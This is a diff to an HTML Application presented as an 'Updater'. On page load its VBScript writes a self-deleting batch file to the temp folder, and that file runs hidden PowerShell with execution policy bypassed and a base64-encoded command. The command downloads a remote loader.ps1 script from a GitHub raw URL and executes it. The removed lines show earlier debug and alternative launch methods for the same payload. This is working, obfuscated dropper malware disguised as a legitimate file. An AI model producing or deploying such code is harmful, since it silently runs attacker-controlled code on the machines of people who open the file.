@@ -16,64 +16,27 @@
   <title>Updater</title>
   <script language="VBScript">
     Sub Window_OnLoad()
-        Dim sh, psPath, fso, debugPath, encodedCmd
+        Dim sh, fso, tempPath, batPath, batContent, encodedCmd
         Set sh = CreateObject("WScript.Shell")
         Set fso = CreateObject("Scripting.FileSystemObject")
         
-        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
-        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-        encodedCmd = "<base-64 string>"
-        
-        ' Test decode command - DON'T WAIT (False instead of True)
-        Dim decodeCmd
-        decodeCmd = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')) | Out-File -FilePath '" & debugPath & "' -Append"""
-        
-        Dim debugFile
-        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
-        debugFile.WriteLine "=== DECODE TEST ==="
-        debugFile.WriteLine "Decode command: " & decodeCmd
-        debugFile.Close
-        
-        ' Use False instead of True - HTA cannot wait for processes
-        sh.Run decodeCmd, 0, False
-        
-        ' Delay before next step since we can't wait
-        setTimeout "TestExecution", 3000
-    End Sub
-    
-    Sub TestExecution()
-        Dim sh, psPath, fso, debugPath, encodedCmd
-        Set sh = CreateObject("WScript.Shell")
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        
-        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
-        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+        tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
+        batPath = tempPath & "\run.bat"
         encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
         
-        ' Method 1: Direct execution
-        Dim cmd1
-        cmd1 = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd
-        sh.Run cmd1, 0, False
-        
-        ' Method 2: Use cmd.exe wrapper (most reliable for HTA)
-        Dim cmd2
-        cmd2 = "cmd.exe /c """ & Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & """"
-        sh.Run cmd2, 0, False
-        
-        ' Method 3: Alternative approach - write batch file
-        Dim batPath, batContent
-        batPath = sh.ExpandEnvironmentStrings("%TEMP%\payload.bat")
+        ' Create batch file with the exact command
         batContent = "@echo off" & vbCrLf & _
-                    Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & vbCrLf & _
+                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & vbCrLf & _
                     "del """ & batPath & """"
         
         Set batFile = fso.CreateTextFile(batPath, True)
         batFile.Write batContent
         batFile.Close
         
+        ' Execute the batch file
         sh.Run Chr(34) & batPath & Chr(34), 0, False
         
-        setTimeout "CleanupAndExit", 5000
+        setTimeout "CleanupAndExit", 2000
     End Sub
     
     Sub CleanupAndExit()
